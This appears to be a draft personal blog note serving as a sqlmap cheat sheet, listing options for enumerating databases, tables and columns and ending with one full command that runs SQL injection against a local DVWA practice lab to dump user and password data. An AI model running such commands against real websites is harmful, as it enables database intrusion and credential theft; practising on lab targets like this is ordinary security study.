---
title: "Sqlmap"
date: 2020-04-08T14:12:52+08:00
tags: []
draft: true
---

```
-u # URL

--cookie="k:v;k:v" # set Cookie

--batch # no interaction(交互)

--dbs # show databases

--tables # show tables

-T # Table

--columns # show columns

-C # column

--dump

sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low;PHPSESSID=na1gq5d41pp1hccflp3ornehm3" --users --passwords -D dvwa -T users -C "user,password" --dump  --batch

```